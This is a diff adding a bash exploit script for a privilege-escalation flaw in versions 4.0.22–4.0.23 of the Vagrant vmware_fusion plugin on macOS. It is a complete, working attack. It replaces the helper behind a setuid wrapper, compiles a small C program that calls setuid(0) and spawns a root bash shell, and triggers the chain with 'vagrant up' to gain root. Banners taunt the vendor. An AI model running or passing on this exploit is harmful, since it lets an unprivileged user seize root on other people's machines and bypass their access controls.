@@ -1,0 +1,89 @@
+#!/bin/bash
+echo
+echo "****************************************************************"
+echo "* Wooo vmware_fusion plugin 4.0.22-4.0.23 is still exploitable *"
+echo "* m4rkw                                                        *"
+echo "****************************************************************"
+echo
+echo "Shouts to #coolkids"
+echo
+
+vuln_bin=`find ~/.vagrant.d/ -name vagrant_vmware_desktop_sudo_helper_wrapper_darwin_amd64 -perm +4000 |tail -n1`
+target="/tmp/vagrant_vmware_privesc_4.0.23"
+
+if [ "$vuln_bin" == "" ] ; then
+  echo "Vulnerable binary not found."
+  exit 1
+fi
+
+if [ -e "$target" ] ; then
+  echo "Exploit payload already present."
+  $target
+  exit
+fi
+
+box=`vagrant box list |grep '(vmware_desktop' |head -n1 |cut -d ' ' -f1`
+
+if [ "$box" == "" ] ; then
+  echo "No vmware_fusion boxes found locally, we will have to download one."
+  echo
+  echo "This will take a few minutes."
+  echo
+  box="bento/ubuntu-16.04"
+fi
+
+dir=`dirname "$vuln_bin"`
+
+cd "$dir"
+
+if [ ! -e "vagrant_vmware_desktop_sudo_helper.bak" ] ; then
+  mv vagrant_vmware_desktop_sudo_helper vagrant_vmware_desktop_sudo_helper.bak
+fi
+
+cat > $target.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash","-c","/bin/bash;rm -f $target",NULL);
+  return 0;
+}
+EOF
+gcc -o $target $target.c
+rm -f $target.c
+
+cat > vagrant_vmware_desktop_sudo_helper <<EOF
+#!/usr/bin/env ruby
+\`chown root:wheel $target\`
+\`chmod 4755 $target\`
+EOF
+
+chmod 755 vagrant_vmware_desktop_sudo_helper
+
+cat > vagrantfile <<EOF
+Vagrant.configure('2') do |config|
+  config.vm.box = '$box'
+end
+EOF
+
+vagrant up 2>/dev/null &
+
+while :
+do
+  r=`ls -la $target |grep -- '-rwsr-xr-x  1 root  wheel'`
+  if [ "$r" != "" ] ; then
+    break
+  fi
+  sleep 0.2
+done
+
+killall -9 vagrant
+
+echo
+echo "Sorry Hashicorp.. still fail :P"
+echo
+
+sleep 1
+cd
+$target
